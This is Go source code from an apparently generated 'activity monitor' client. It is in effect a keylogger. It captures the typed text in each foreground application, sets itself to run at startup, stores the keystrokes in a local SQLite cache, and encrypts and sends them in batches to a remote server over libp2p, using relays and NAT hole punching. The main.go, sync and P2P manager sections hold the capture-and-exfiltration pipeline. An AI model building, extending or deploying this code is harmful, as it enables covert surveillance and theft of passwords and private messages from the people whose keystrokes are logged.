func (s *LogStore) PruneOldestEventsAggressively(count int) (int64, error) {
	if count <= 0 {
		return 0, nil
	}
	s.logger.Printf("LogStore: AGGRESSIVE PRUNING - Attempting to delete %d oldest events...", count)

	// This query finds the event_timestamp of the Nth oldest event, then deletes all events up to and including that one.
	// This is safer than deleting TOP N without knowing their exact timestamps if there are many with the same timestamp.
	// However, a simpler "DELETE FROM log_events ORDER BY event_timestamp ASC LIMIT ?" is also common.
	// For SQLite, direct LIMIT in DELETE is supported.
	result, err := s.db.Exec("DELETE FROM log_events WHERE id IN (SELECT id FROM log_events ORDER BY event_timestamp ASC LIMIT ?)", count)
	if err != nil {
		return 0, fmt.Errorf("logstore: aggressive prune failed: %w", err)
	}
	rowsAffected, _ := result.RowsAffected()
	if rowsAffected > 0 {
		s.logger.Printf("LogStore: AGGRESSIVE PRUNING - Successfully deleted %d oldest events.", rowsAffected)
	} else {
		s.logger.Println("LogStore: AGGRESSIVE PRUNING - No events found to delete, or query failed to match any.")
	}
	// After pruning, it's good practice to VACUUM to reclaim disk space, but VACUUM can be slow and locking.
	// SQLite's auto_vacuum mode (if enabled when DB created) helps, or periodic manual VACUUM.
	// For now, we won't auto-vacuum here to avoid blocking.
	return rowsAffected, nil
}

// CheckAndEnforceDBSize checks DB size and triggers aggressive pruning if limit exceeded.
func (s *LogStore) CheckAndEnforceDBSize(maxAllowedMB *uint64) {
	if maxAllowedMB == nil || *maxAllowedMB == 0 {
		return // No limit set
	}
	limitBytes := *maxAllowedMB * 1024 * 1024

	fi, err := os.Stat(s.dbPath)
	if err != nil {
		s.logger.Printf("LogStore: Error stating DB file for size check ('%s'): %v", s.dbPath, err)
		return
	}
	currentSizeBytes := fi.Size()

	if uint64(currentSizeBytes) >= limitBytes {
		s.logger.Printf("LogStore: WARNING - DB size (%d Bytes) meets or exceeds limit (%d Bytes). Initiating aggressive pruning.", currentSizeBytes, limitBytes)

		// Calculate target size and how much to reduce
		targetSizeBytes := uint64(float64(limitBytes) * dbSizeReductionTarget)
		bytesToReduce := currentSizeBytes - int64(targetSizeBytes)

		if bytesToReduce <= 0 {
			s.logger.Println("LogStore: DB size already near target after limit hit, no aggressive prune needed now.")
			return
		}

		// Estimate average event size (very rough) or prune in batches
		// Let's prune in batches until size is met or no more events
		var totalPruned int64
		for uint64(fi.Size()) > targetSizeBytes {
			prunedThisBatch, errPrune := s.PruneOldestEventsAggressively(aggressivePruneBatchSize)
			if errPrune != nil {
				s.logger.Printf("LogStore: Error during aggressive pruning batch: %v. Stopping.", errPrune)
				break
			}
			if prunedThisBatch == 0 { // No more events to prune
				s.logger.Println("LogStore: Aggressive pruning - no more events to delete, but size still over target. DB might contain free pages.")
				break
			}
			totalPruned += prunedThisBatch

			// Re-check file size
			fi, err = os.Stat(s.dbPath)
			if err != nil {
				s.logger.Printf("LogStore: Error re-stating DB file after aggressive prune batch: %v. Stopping.", err)
				break
			}
			// Optional: small delay to allow FS to update / DB to settle if VACUUM was run (it's not here)
			// time.Sleep(100 * time.Millisecond)
		}
		if totalPruned > 0 {
			s.logger.Printf("LogStore: Aggressive pruning completed. Total events deleted: %d. Current DB size: %d Bytes.", totalPruned, fi.Size())
			// Consider running VACUUM if size doesn't drop significantly due to free pages
			// if fi.Size() > int64(targetSizeBytes) * 1.1 { // If still significantly over
			//     s.logger.Println("LogStore: DB size still over target after aggressive prune. Consider manual VACUUM or check for large individual events.")
			// }
		}
	}
}

func (s *LogStore) Close() error {
	if s.db != nil {
		s.logger.Println("LogStore: Closing database connection.")
		return s.db.Close()
	}
	return nil
}

// runSQLiteCacheManager is the goroutine that manages the LogStore.
func runSQLiteCacheManager(
	logStore *LogStore,
	logEventsIn <-chan types.LogEvent,
	internalQuit <-chan struct{},
	wg *sync.WaitGroup,
	retentionDays uint32,
	maxLogFileSizeMB *uint64, // Passed from CfgMaxLogFileSizeMB
) {
	defer wg.Done()
	logStore.logger.Println("SQLite Cache Manager goroutine started.")

	// Regular retention-based pruning ticker
	cleanupInterval := 6 * time.Hour
	if retentionDays == 0 {
		cleanupInterval = 24 * 365 * time.Hour
		logStore.logger.Println("SQLite Cache Manager: Regular pruning disabled (retention is 0 days).")
	}
	cleanupTicker := time.NewTicker(cleanupInterval)
	defer cleanupTicker.Stop()

	// DB size check and aggressive pruning ticker
	dbSizeCheckInterval := 15 * time.Minute // Check DB size more frequently
	if maxLogFileSizeMB == nil || *maxLogFileSizeMB == 0 {
		dbSizeCheckInterval = 24 * 365 * time.Hour
		logStore.logger.Println("SQLite Cache Manager: DB size limit check disabled (no limit set).")
	}
	dbSizeCheckTicker := time.NewTicker(dbSizeCheckInterval)
	defer dbSizeCheckTicker.Stop()

	for {
		select {
		case event, ok := <-logEventsIn:
			if !ok {
				logStore.logger.Println("CACHE_MGR: Log event input channel closed.")
				return
			}
			if err := logStore.AddLogEvent(event); err != nil {
				logStore.logger.Printf("CACHE_MGR: Error adding LogEvent (ID: %s) to SQLite: %v", event.ID, err)
			}

		case <-cleanupTicker.C:
			if retentionDays > 0 {
				_, err := logStore.PruneOldLogs(retentionDays)
				if err != nil {
					logStore.logger.Printf("CACHE_MGR: Error during regular log pruning: %v", err)
				}
			}

		case <-dbSizeCheckTicker.C:
			// This check now also enforces the size limit by aggressive pruning
			logStore.CheckAndEnforceDBSize(maxLogFileSizeMB)

		case <-internalQuit:
			logStore.logger.Println("SQLite Cache Manager goroutine stopping.")
			return
		}
	}
}

'''
'''--- generator/templates/client_template/main.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/main.go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	// Project's shared packages
	"guikeystandalonego/pkg/crypto" // For AES encryption for P2P payload
	"guikeystandalonego/pkg/p2p"
	"guikeystandalonego/pkg/types" // For LogEvent, ApplicationActivity

	// External dependencies
	"github.com/google/uuid"        // For parsing CfgClientID
	_ "github.com/mattn/go-sqlite3" // SQLite driver, side effect import
	// Note: "golang.org/x/sys/windows/registry" is used by autorun_windows.go
	// and "golang.org/x/sys/windows" is used by foreground_windows.go & keyboard_windows.go.
	// These are resolved because all these .go files are 'package main' and compiled together,
	// and the root go.mod should have 'golang.org/x/sys'.
)

// Global logger for the client application
var (
	clientGlobalLogger *log.Logger
)

// setupLogger initializes the file-based logger.
func setupLogger(logDir, logFile string) error {
	absLogDir := logDir
	if !filepath.IsAbs(logDir) {
		exePath, err := os.Executable()
		if err != nil {
			fmt.Fprintf(os.Stderr, "CRITICAL: Cannot get executable path for logger: %v. Using current directory for logs.\n", err)
			absLogDir = "." // Fallback
		} else {
			absLogDir = filepath.Join(filepath.Dir(exePath), logDir)
		}
	}

	if err := os.MkdirAll(absLogDir, 0755); err != nil {
		return fmt.Errorf("failed to create log directory %s: %w", absLogDir, err)
	}

	logPath := filepath.Join(absLogDir, logFile)
	file, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open log file %s: %w", logPath, err)
	}
	clientGlobalLogger = log.New(file, "CLIENT: ", log.LstdFlags|log.Lshortfile)
	// Log level from CfgInternalLogLevel is used conceptually here; a real leveled logger would apply it.
	clientGlobalLogger.Printf("Client logger initialized (Level: %s). Log file: %s", CfgInternalLogLevel, logPath)
	return nil
}

// activeSessionData holds data for the current application session.
type activeSessionData struct {
	startTime          time.Time
	pid                uint32
	applicationName    string
	initialWindowTitle string
	typedText          strings.Builder
}

// reset reinitializes the active session data.
func (s *activeSessionData) reset(start time.Time, pid uint32, appName, title string) {
	s.startTime = start
	s.pid = pid
	s.applicationName = appName
	s.initialWindowTitle = title
	s.typedText.Reset()
}

// isEmpty checks if the current session has accumulated any typed text.
func (s *activeSessionData) isEmpty() bool {
	return s.typedText.Len() == 0
}

// runEventAggregator processes raw monitoring events into structured LogEvents.
func runEventAggregator(
	appEventIn <-chan ActiveAppEvent,
	processedKeyIn <-chan ProcessedKeyEvent,
	logEventOut chan<- types.LogEvent,
	internalQuit <-chan struct{},
	logger *log.Logger,
	clientIDString string,
	periodicFlushInterval time.Duration,
) {
	logger.Println("Event aggregator goroutine started.")

	var currentSession *activeSessionData = nil
	var clientUUID uuid.UUID
	parsedUUID, err := uuid.Parse(clientIDString)
	if err != nil {
		logger.Printf("EVENT AGGR: CRITICAL - Invalid ClientID UUID string '%s': %v. Using zero UUID.", clientIDString, err)
	} else {
		clientUUID = parsedUUID
	}

	flushTicker := time.NewTicker(periodicFlushInterval)
	defer flushTicker.Stop()

	finalizeSession := func(sessionEndTime time.Time, reason string) {
		if currentSession != nil && !currentSession.isEmpty() {
			logEntry := types.NewApplicationActivityEvent(
				clientUUID,
				currentSession.applicationName,
				currentSession.initialWindowTitle,
				currentSession.startTime,
				sessionEndTime,
				strings.TrimSpace(currentSession.typedText.String()),
			)
			logger.Printf("EVENT AGGR: Finalizing session for '%s' (Reason: %s): %d chars. Start: %s, End: %s",
				currentSession.applicationName, reason, currentSession.typedText.Len(),
				currentSession.startTime.Format(time.RFC3339), sessionEndTime.Format(time.RFC3339))

			select {
			case logEventOut <- logEntry:
				logger.Printf("EVENT AGGR: Sent LogEvent (ID: %s) for %s to cache/sync.", logEntry.ID, logEntry.ApplicationName)
			case <-time.After(2 * time.Second):
				logger.Println("EVENT AGGR: Timeout sending LogEvent to output channel. Event might be lost if channel is full and not consumed.")
			}
		}
		currentSession = nil
	}

	for {
		select {
		case appEvent, ok := <-appEventIn:
			if !ok {
				logger.Println("EVENT AGGR: App event channel closed.")
				appEventIn = nil
				if processedKeyIn == nil && appEventIn == nil {
					return
				}
				continue
			}

			shouldStartNewSession := false
			if appEvent.IsSwitch {
				shouldStartNewSession = true
			}
			if currentSession == nil && appEvent.Info.PID != 0 && appEvent.Info.ProcessName != "" {
				shouldStartNewSession = true
			}
			if currentSession != nil && appEvent.Info.PID != 0 && appEvent.Info.PID != currentSession.pid {
				logger.Printf("EVENT AGGR: Detected PID change (%d -> %d) for app '%s' -> '%s'. Forcing new session.",
					currentSession.pid, appEvent.Info.PID, currentSession.applicationName, appEvent.Info.ProcessName)
				shouldStartNewSession = true
			}

			if shouldStartNewSession {
				finalizeSession(appEvent.Timestamp, "App Switch/New App")
				if appEvent.Info.PID != 0 && appEvent.Info.ProcessName != "" {
					currentSession = &activeSessionData{}
					currentSession.reset(appEvent.Timestamp, appEvent.Info.PID, appEvent.Info.ProcessName, appEvent.Info.Title)
					logger.Printf("EVENT AGGR: Started new session for App: %s (PID: %d) - Title: \"%s\"",
						currentSession.applicationName, currentSession.pid, currentSession.initialWindowTitle)
				} else {
					logger.Printf("EVENT AGGR: App focus likely lost or new app info invalid (PID: %d, Name: '%s'). No active session.", appEvent.Info.PID, appEvent.Info.ProcessName)
				}
			} else if currentSession != nil && appEvent.Info.PID == currentSession.pid && appEvent.Info.Title != currentSession.initialWindowTitle {
				logger.Printf("EVENT AGGR: Title updated for current app '%s' (PID: %d) to \"%s\". (IsSwitch from monitor: %t)",
					currentSession.applicationName, currentSession.pid, appEvent.Info.Title, appEvent.IsSwitch)
			}

		case pKey, ok := <-processedKeyIn:
			if !ok {
				logger.Println("EVENT AGGR: Processed key channel closed.")
				processedKeyIn = nil
				if processedKeyIn == nil && appEventIn == nil {
					return
				}
				continue
			}
			if currentSession == nil {
				continue
			}

			if pKey.IsKeyDown {
				textToAppend := ""
				if pKey.IsChar {
					textToAppend = pKey.KeyValue
				} else if !strings.HasPrefix(pKey.KeyValue, "[VK_") {
					textToAppend = pKey.KeyValue
					if pKey.KeyValue == "[ENTER]" || pKey.KeyValue == "[TAB]" || strings.HasPrefix(pKey.KeyValue, "[F") {
						textToAppend += " "
					}
				}
				if textToAppend != "" {
					currentSession.typedText.WriteString(textToAppend)
				}
			}

		case <-flushTicker.C:
			if currentSession != nil && !currentSession.isEmpty() {
				segmentEndTime := time.Now().UTC()
				logEntry := types.NewApplicationActivityEvent(
					clientUUID,
					currentSession.applicationName,
					currentSession.initialWindowTitle,
					currentSession.startTime,
					segmentEndTime,
					strings.TrimSpace(currentSession.typedText.String()),
				)
				select {
				case logEventOut <- logEntry:
					logger.Printf("EVENT AGGR: Sent periodic LogEvent (ID: %s) for '%s' to cache/sync.", logEntry.ID, logEntry.ApplicationName)
				case <-time.After(2 * time.Second):
					logger.Println("EVENT AGGR: Timeout sending periodic LogEvent. Event might be lost.")
				}
				currentSession.typedText.Reset()
				currentSession.startTime = segmentEndTime
			}

		case <-internalQuit:
			logger.Println("Event aggregator goroutine stopping.")
			finalizeSession(time.Now().UTC(), "Client Shutdown")
			return
		}
	}
}

// runSyncManager periodically attempts to send cached logs to the server.
func runSyncManager(
	logStore *LogStore,
	p2pMan *P2PManager,
	internalQuit <-chan struct{},
	wg *sync.WaitGroup,
	logger *log.Logger,
	syncInterval time.Duration,
	maxEventsPerBatch int,
	clientID string,
	encryptionKeyHex string,
	maxRetries uint32,
	retryInterval time.Duration,
) {
	defer wg.Done()
	if syncInterval == 0 {
		logger.Println("SyncManager: Sync interval is 0, sync effectively disabled.")
		<-internalQuit
		logger.Println("SyncManager: Shutting down (was disabled).")
		return
	}
	logger.Printf("SyncManager: Started. Sync interval: %v, Max events/batch: %d", syncInterval, maxEventsPerBatch)

	logger.Println("SyncManager: Performing initial sync check on startup...")
	performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)

	ticker := time.NewTicker(syncInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			logger.Println("SyncManager: Performing periodic sync check...")
			performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)

		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signal received. Performing final sync attempt...")
			performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)
			logger.Println("SyncManager: Shutting down.")
			return
		}
	}
}

// performSyncCycle contains the logic for one sync attempt.
func performSyncCycle(
	logStore *LogStore,
	p2pMan *P2PManager,
	logger *log.Logger,
	maxEventsPerBatch int,
	clientID string,
	encryptionKeyHex string,
	maxRetries uint32,
	retryInterval time.Duration,
	internalQuit <-chan struct{},
) {
	eventsToSync, err := logStore.GetBatchForSync(maxEventsPerBatch)
	if err != nil {
		logger.Printf("SyncManager: Error getting batch from LogStore: %v", err)
		return
	}

	if len(eventsToSync) == 0 {
		return
	}
	logger.Printf("SyncManager: Found %d events to sync.", len(eventsToSync))

	jsonData, err := json.Marshal(eventsToSync)
	if err != nil {
		logger.Printf("SyncManager: Error marshaling events to JSON: %v. Batch not sent.", err)
		return
	}

	encryptedPayload, err := crypto.Encrypt(jsonData, encryptionKeyHex) // Using pkgCrypto
	if err != nil {
		logger.Printf("SyncManager: Error encrypting payload: %v. Batch not sent.", err)
		return
	}
	// logger.Printf("SyncManager: Payload encrypted (%d bytes original -> %d bytes encrypted).", len(jsonData), len(encryptedPayload)) // Can be noisy

	var attempt uint32
	for attempt = 0; attempt < maxRetries; attempt++ {
		select {
		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signaled during sync cycle before send. Aborting.")
			return
		default:
		}

		sendCtx, cancelSendCtx := context.WithTimeout(context.Background(), 75*time.Second) // Increased overall P2P op timeout

		sendDone := make(chan struct{})
		var response *p2p.LogBatchResponse
		var sendErr error

		go func() {
			defer close(sendDone) // Ensure sendDone is closed to unblock select
			response, sendErr = p2pMan.SendLogBatch(sendCtx, clientID, encryptedPayload)
		}()

		select {
		case <-sendDone:
			// SendLogBatch completed or timed out via sendCtx
		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signaled during P2P send. Cancelling send context.")
			cancelSendCtx()
			<-sendDone
			logger.Println("SyncManager: P2P send cancelled due to shutdown. Aborting sync cycle.")
			return
		}
		cancelSendCtx() // Clean up the sendCtx resources

		if sendErr != nil {
			logger.Printf("SyncManager: Attempt %d/%d failed to send log batch: %v", attempt+1, maxRetries, sendErr)
			if attempt < maxRetries-1 {
				logger.Printf("SyncManager: Retrying in %v...", retryInterval)
				select {
				case <-time.After(retryInterval):
				case <-internalQuit:
					logger.Println("SyncManager: Shutdown signaled during retry wait. Aborting sync.")
					return
				}
				continue
			} else {
				logger.Printf("SyncManager: Max retries (%d) reached for sending batch. Batch remains in cache.", maxRetries)
				return
			}
		}

		if response != nil && response.Status == "success" {
			logger.Printf("SyncManager: Batch successfully synced to server. Server processed %d of %d events.", response.EventsProcessed, len(eventsToSync))
			eventIDs := make([]uuid.UUID, len(eventsToSync))
			for i, ev := range eventsToSync {
				eventIDs[i] = ev.ID
			}
			if err := logStore.ConfirmEventsSynced(eventIDs); err != nil {
				logger.Printf("SyncManager: CRITICAL ERROR - Failed to confirm synced events in LogStore: %v. Data may be resent.", err)
			}
			return
		} else {
			errMsg := "unknown server error or nil response"
			if response != nil {
				errMsg = fmt.Sprintf("status='%s', message='%s', server_processed=%d", response.Status, response.Message, response.EventsProcessed)
			}
			logger.Printf("SyncManager: Server indicated failure for batch (Attempt %d/%d): %s.", attempt+1, maxRetries, errMsg)
			if attempt < maxRetries-1 {
				logger.Printf("SyncManager: Retrying server-indicated failure in %v...", retryInterval)
				select {
				case <-time.After(retryInterval):
				case <-internalQuit:
					logger.Println("SyncManager: Shutdown signaled during retry wait. Aborting sync.")
					return
				}
				continue
			} else {
				logger.Printf("SyncManager: Max retries (%d) reached after server-indicated failure. Batch remains in cache.", maxRetries)
				return
			}
		}
	}
}

func main() {
	// Initialize logger first
	if err := setupLogger(CfgInternalLogFileDir, CfgInternalLogFileName); err != nil {
		// Fallback if logger setup fails
		fallbackLogPath := "client_critical_error.log"
		// Attempt to determine exe dir for fallback, otherwise use current dir
		if exeP, errExe := os.Executable(); errExe == nil {
			fallbackLogPath = filepath.Join(filepath.Dir(exeP), "client_critical_error.log")
		} else {
			fmt.Fprintf(os.Stderr, "CRITICAL: Cannot get executable path for fallback log: %v\n", errExe)
		}
		_ = os.WriteFile(fallbackLogPath, []byte(fmt.Sprintf("CRITICAL: Failed to setup logger: %v. Exiting.\n", err)), 0644)
		os.Exit(1) // Exit if logger cannot be initialized
	}

	clientGlobalLogger.Printf("Client Activity Monitor starting. Version: DEV. ClientID: %s", CfgClientID)
	clientGlobalLogger.Printf("Target Server PeerID: %s", CfgServerPeerID)
	clientGlobalLogger.Printf("Bootstrap Addresses: %v", CfgBootstrapAddresses)
	clientGlobalLogger.Printf("Log File Path (for SQLite DB): %s", CfgLogFilePath)
	if CfgMaxLogFileSizeMB != nil {
		clientGlobalLogger.Printf("Max Log SQLite DB Size (MB): %d", *CfgMaxLogFileSizeMB)
	} else {
		clientGlobalLogger.Println("Max Log SQLite DB Size (MB): Unlimited")
	}

	// --- Setup Autostart ---
	exePath, err := os.Executable() // Get current executable's path
	if err != nil {
		clientGlobalLogger.Printf("Autorun WARNING: Could not get executable path: %v. Autostart setup skipped.", err)
	} else {
		if err := setupAutostart(CfgAppNameForAutorun, exePath, clientGlobalLogger); err != nil {
			clientGlobalLogger.Printf("Autorun WARNING: Failed to set up autostart: %v. Continuing execution.", err)
		} else {
			// Autostart setup logged within setupAutostart function
		}
	}
	// --- End Autostart Setup ---

	// Initialize LogStore (SQLite)
	dbPath := CfgLogFilePath
	if !filepath.IsAbs(dbPath) {
		// exePath should be valid if autostart setup didn't fatally error on it
		if exePath == "" { // Should not happen if previous block ran
			exeP, errExe := os.Executable()
			if errExe != nil {
				clientGlobalLogger.Fatalf("CRITICAL: Failed to get executable path for DB (second attempt): %v", errExe)
			}
			exePath = exeP
		}
		dbPath = filepath.Join(filepath.Dir(exePath), CfgLogFilePath)
	}

	logStore, err := NewLogStore(dbPath, clientGlobalLogger)
	if err != nil {
		clientGlobalLogger.Fatalf("CRITICAL: Failed to initialize LogStore: %v", err)
	}
	defer func() {
		if errClose := logStore.Close(); errClose != nil {
			clientGlobalLogger.Printf("Error closing LogStore: %v", errClose)
		}
	}()

	// Initialize P2PManager
	p2pMan, err := NewP2PManager(clientGlobalLogger, CfgServerPeerID, CfgBootstrapAddresses)
	if err != nil {
		clientGlobalLogger.Fatalf("CRITICAL: Failed to initialize P2PManager: %v", err)
	}
	defer p2pMan.Close()

	// --- Channels & WaitGroup for graceful shutdown ---
	osQuitChan := make(chan os.Signal, 1)
	signal.Notify(osQuitChan, syscall.SIGINT, syscall.SIGTERM)
	internalQuitChan := make(chan struct{})
	var wg sync.WaitGroup

	// --- Event Channels ---
	appActivityEventChan := make(chan ActiveAppEvent, 100)
	rawKeyDataChan := make(chan RawKeyData, 256)
	processedKeyDataChan := make(chan ProcessedKeyEvent, 256)
	logEventOutChan := make(chan types.LogEvent, 100) // From aggregator to cache manager

	// --- Start Goroutines ---
	wg.Add(1)
	go func() {
		defer wg.Done()
		monitorForegroundApp(appActivityEventChan, 1*time.Second, internalQuitChan, clientGlobalLogger)
	}()
	clientGlobalLogger.Println("Foreground app monitor goroutine started.")

	startKeyboardMonitor(rawKeyDataChan, internalQuitChan, &wg, clientGlobalLogger) // Manages its own wg.Add/Done internally

	wg.Add(1)
	go func() {
		defer wg.Done()
		processRawKeyEvents(rawKeyDataChan, processedKeyDataChan, internalQuitChan, clientGlobalLogger)
	}()

	wg.Add(1)
	flushInterval := time.Duration(CfgProcessorPeriodicFlushIntervalSecs) * time.Second
	if CfgProcessorPeriodicFlushIntervalSecs == 0 {
		flushInterval = 24 * 365 * time.Hour
		clientGlobalLogger.Println("Event Aggregator: Periodic flush effectively disabled.")
	}
	go runEventAggregator(appActivityEventChan, processedKeyDataChan, logEventOutChan, internalQuitChan, clientGlobalLogger, CfgClientID, flushInterval)

	wg.Add(1)
	go runSQLiteCacheManager(logStore, logEventOutChan, internalQuitChan, &wg, CfgLocalLogCacheRetentionDays, CfgMaxLogFileSizeMB)

	wg.Add(1)
	go runP2PManager(p2pMan, internalQuitChan, &wg, clientGlobalLogger)

	wg.Add(1)
	syncIntervalDur := time.Duration(CfgSyncIntervalSecs) * time.Second
	if CfgSyncIntervalSecs == 0 {
		syncIntervalDur = 24 * 365 * time.Hour
	}
	retryIntervalDur := time.Duration(CfgRetryIntervalOnFailSecs) * time.Second
	go runSyncManager(
		logStore, p2pMan, internalQuitChan, &wg, clientGlobalLogger,
		syncIntervalDur, CfgMaxEventsPerSyncBatch, CfgClientID,
		CfgEncryptionKeyHex, CfgMaxRetriesPerBatch, retryIntervalDur,
	)

	clientGlobalLogger.Println("Client main components initialized. Waiting for shutdown signal...")
	<-osQuitChan // Block until OS signal
	clientGlobalLogger.Println("OS shutdown signal received. Signaling goroutines to stop...")
	close(internalQuitChan) // Signal all dependent goroutines
	clientGlobalLogger.Println("Waiting for goroutines to complete...")
	wg.Wait() // Wait for all goroutines to finish
	clientGlobalLogger.Println("All client components shut down gracefully.")
}

'''
'''--- generator/templates/client_template/p2p_manager.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/p2p_manager.go
package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"guikeystandalonego/pkg/p2p" // Your P2P protocol definitions

	"github.com/libp2p/go-libp2p"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p/core/event"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/routing"

	// mDNS can be added back if desired for pure LAN fallback
	// "github.com/libp2p/go-libp2p/p2p/discovery/mdns"
	routd "github.com/libp2p/go-libp2p/p2p/discovery/routing"
	// AutoRelay import for options
)

type P2PManager struct {
	host             host.Host
	kademliaDHT      *dht.IpfsDHT
	routingDiscovery *routd.RoutingDiscovery
	// AutoNAT client is managed by the host automatically
	logger             *log.Logger
	serverPeerIDStr    string
	bootstrapAddrInfos []peer.AddrInfo
}

func NewP2PManager(logger *log.Logger, serverPeerID string, bootstrapAddrs []string) (*P2PManager, error) {
	if logger == nil {
		logger = log.New(os.Stdout, "P2P_CLIENT_FALLBACK: ", log.LstdFlags|log.Lshortfile)
	}

	var bootAddrsInfo []peer.AddrInfo
	for _, addrStr := range bootstrapAddrs {
		if addrStr == "" {
			continue
		}
		ai, err := peer.AddrInfoFromString(addrStr)
		if err != nil {
			logger.Printf("P2P Client WARN: Invalid bootstrap address string '%s': %v", addrStr, err)
			continue
		}
		bootAddrsInfo = append(bootAddrsInfo, *ai)
	}
	if len(bootAddrsInfo) == 0 {
		logger.Println("P2P Client WARN: No valid bootstrap addresses configured. DHT discovery will be severely limited unless on LAN with mDNS.")
	}

	var opts []libp2p.Option
	opts = append(opts, libp2p.ListenAddrStrings(
		"/ip4/0.0.0.0/tcp/0",
		"/ip4/0.0.0.0/udp/0/quic-v1", // Enable QUIC
	))
	opts = append(opts, libp2p.EnableRelay())
	opts = append(opts, libp2p.EnableHolePunching())
	// AutoNAT is enabled by default in newer versions, no explicit call needed

	if len(bootAddrsInfo) > 0 {
		// Fixed: EnableAutoRelayWithStaticRelays now requires autorelay options
		opts = append(opts, libp2p.EnableAutoRelayWithStaticRelays(bootAddrsInfo))
	} else {
		opts = append(opts, libp2p.EnableAutoRelay())
	}

	var kadDHT *dht.IpfsDHT
	opts = append(opts,
		libp2p.Routing(func(h host.Host) (routing.PeerRouting, error) {
			var err error
			dhtOpts := []dht.Option{dht.Mode(dht.ModeClient)}
			// DHT will use connected peers (like bootstrap) automatically,
			// but explicitly providing them to dht.New can also be done.
			// dht.BootstrapPeers is good for the initial bootstrap call later.
			kadDHT, err = dht.New(context.Background(), h, dhtOpts...)
			return kadDHT, err
		}),
	)

	p2pHost, err := libp2p.New(opts...)
	if err != nil {
		return nil, fmt.Errorf("p2p client: failed to create libp2p host: %w", err)
	}
	logger.Printf("P2P Client: Host created with ID: %s", p2pHost.ID().String())

	if kadDHT == nil {
		p2pHost.Close()
		return nil, fmt.Errorf("p2p client: Kademlia DHT was not initialized during host setup")
	}
	logger.Println("P2P Client: AutoNAT service and Kademlia DHT initialized with host.")

	return &P2PManager{
		host:               p2pHost,
		kademliaDHT:        kadDHT,
		logger:             logger,
		serverPeerIDStr:    serverPeerID,
		bootstrapAddrInfos: bootAddrsInfo,
	}, nil
}

func (pm *P2PManager) StartDiscoveryAndBootstrap(ctx context.Context) {
	pm.logger.Println("P2P Client: Starting discovery and bootstrap processes...")

	if len(pm.bootstrapAddrInfos) == 0 {
		pm.logger.Println("P2P Client: No bootstrap peers configured. DHT may not function effectively.")
		// Consider if mDNS should be started as a fallback for LAN here
		// pm.startMDNS(ctx)
		return // Still start other goroutines like findServer, address monitor
	}

	// Initial connection attempt to bootstrap peers
	pm.connectToBootstrapPeers(ctx)

	// Goroutine for periodic bootstrap retries and DHT re-bootstrap
	go func() {
		// Short initial delay, then longer periodic bootstraps
		initialBootstrapTimer := time.NewTimer(30 * time.Second) // Increased initial delay
		defer initialBootstrapTimer.Stop()

		bootstrapRetryTicker := time.NewTicker(5 * time.Minute)
		defer bootstrapRetryTicker.Stop()
		dhtReBootstrapTicker := time.NewTicker(20 * time.Minute) // Less frequent re-bootstrap
		defer dhtReBootstrapTicker.Stop()

		firstBootstrapDone := false

		for {
			select {
			case <-ctx.Done():
				pm.logger.Println("P2P Client: Bootstrap/Discovery supervisor goroutine stopping.")
				return
			case <-initialBootstrapTimer.C:
				if !firstBootstrapDone {
					pm.logger.Println("P2P Client: Attempting initial Kademlia DHT bootstrap...")
					if err := pm.kademliaDHT.Bootstrap(ctx); err != nil {
						pm.logger.Printf("P2P Client: Initial Kademlia DHT bootstrap failed: %v (will retry via ticker)", err)
					} else {
						pm.logger.Println("P2P Client: Initial Kademlia DHT bootstrap process completed/initiated.")
					}
					pm.routingDiscovery = routd.NewRoutingDiscovery(pm.kademliaDHT)
					firstBootstrapDone = true
				}
			case <-bootstrapRetryTicker.C:
				pm.logger.Println("P2P Client: Periodically retrying connections to bootstrap peers...")
				pm.connectToBootstrapPeers(ctx)
			case <-dhtReBootstrapTicker.C:
				pm.logger.Println("P2P Client: Periodically re-bootstrapping Kademlia DHT...")
				if err := pm.kademliaDHT.Bootstrap(ctx); err != nil { // Bootstrap again
					pm.logger.Printf("P2P Client: Periodic Kademlia DHT bootstrap failed: %v", err)
				} else {
					pm.logger.Println("P2P Client: Periodic Kademlia DHT bootstrap initiated.")
				}
			}
		}
	}()

	go pm.periodicallyFindServer(ctx)
	go pm.monitorAddressAndNATChanges(ctx)
}

func (pm *P2PManager) connectToBootstrapPeers(ctx context.Context) {
	if len(pm.bootstrapAddrInfos) == 0 {
		return
	}
	pm.logger.Printf("P2P Client: Attempting to connect to %d bootstrap peers if not already connected...", len(pm.bootstrapAddrInfos))
	var wg sync.WaitGroup
	for _, pi := range pm.bootstrapAddrInfos {
		if pm.host.Network().Connectedness(pi.ID) == network.Connected {
			continue // Skip if already connected
		}
		wg.Add(1)
		go func(peerInfo peer.AddrInfo) {
			defer wg.Done()
			connectCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
			defer cancel()
			if err := pm.host.Connect(connectCtx, peerInfo); err != nil {
				// These logs can be noisy if bootstrap nodes are flaky, consider reducing verbosity for repeated failures
				// pm.logger.Printf("P2P Client: Failed to connect to bootstrap peer %s (%v): %v", peerInfo.ID, peerInfo.Addrs, err)
			} else {
				pm.logger.Printf("P2P Client: Successfully connected to bootstrap peer: %s", peerInfo.ID.String())
			}
		}(pi)
	}
	// Don't wait with wg.Wait() to allow them to connect in the background
}

func (pm *P2PManager) monitorAddressAndNATChanges(ctx context.Context) {
	addrSub, err := pm.host.EventBus().Subscribe(new(event.EvtLocalAddressesUpdated))
